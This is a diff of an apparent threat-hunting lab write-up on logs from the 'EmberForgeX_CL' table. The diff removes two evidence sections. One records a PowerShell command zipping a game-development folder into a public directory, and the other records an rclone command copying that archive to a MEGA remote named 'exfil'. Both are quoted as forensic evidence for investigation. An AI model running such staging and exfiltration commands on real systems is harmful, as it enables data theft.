@@ -45,19 +45,6 @@ EmberForgeX_CL
 | order by TimeGenerated asc
 ```
 
-## Evidence Identified
-
-```powershell
-powershell.exe -c "Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip"
-```
-
-## Findings
-
-| Artifact         | Value                       |
-| ---------------- | --------------------------- |
-| Source Directory | C:\GameDev                  |
-| Archive File     | C:\Users\Public\gamedev.zip |
-| Cmdlet Used      | Compress-Archive            |
 
 ### Screenshot
 
@@ -76,22 +63,11 @@ EmberForgeX_CL
 | order by TimeGenerated asc
 ```
 
-## Evidence Identified
-
-```cmd
-C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\Users\Public\gamedev.zip mega:exfil -v
-```
-
-## Findings
-
-| Artifact          | Value      |
-| ----------------- | ---------- |
-| Exfiltration Tool | rclone.exe |
-| Cloud Provider    | MEGA       |
 
 ### Screenshot
 
-(Add screenshot here)
+<img width="1014" height="325" alt="image" src="https://github.com/user-attachments/assets/3d01643f-35c4-4686-ace2-2c43c3da28a1" />
+
 
 ---
 
